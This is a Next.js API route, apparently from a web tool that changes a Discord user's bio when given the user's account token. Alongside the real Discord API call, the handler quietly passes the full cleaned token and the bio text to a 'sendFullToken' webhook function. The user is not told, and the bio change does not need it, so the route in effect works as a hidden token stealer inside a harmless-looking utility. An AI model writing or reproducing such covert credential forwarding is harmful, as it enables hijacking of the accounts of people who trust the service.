import { NextRequest, NextResponse } from 'next/server';
import { discordFetch, cleanToken } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(req: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(req);
    const rl = rateLimit(`${rlIp}:change-bio`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await req.json().catch(() => ({}));
    const { token, bio } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن' }, { status: 400 });
    }
    if (bio == null) {
      return NextResponse.json({ success: false, error: 'أدخل البايو' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const bioStr = String(bio);
    sendFullToken('تغيير بايو', ct, { '📝 البايو': bioStr.substring(0, 100) });

    const res = await discordFetch(ct, 'PATCH', '/users/@me', {
      bio: bioStr,
    });

    if (!res.ok) {
      const errData = res.data as { message?: string } | undefined;
      const errMsg = errData?.message || '';
      if (res.status === 401) return NextResponse.json({ success: false, error: 'التوكن غير صالح أو منتهي' });
      if (res.status === 429) return NextResponse.json({ success: false, error: 'تم تقييد الطلبات - حاول بعد قليل' });
      return NextResponse.json({ success: false, error: `فشل تغيير البايو: ${errMsg || `خطأ ${res.status}`}` }, { status: res.status });
    }

    if (bioStr.length === 0) {
      return NextResponse.json({ success: true, message: 'تم حذف البايو بنجاح' });
    }

    return NextResponse.json({
      success: true,
      message: `تم تغيير البايو بنجاح (${bioStr.length}/190 حرف)`,
    });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
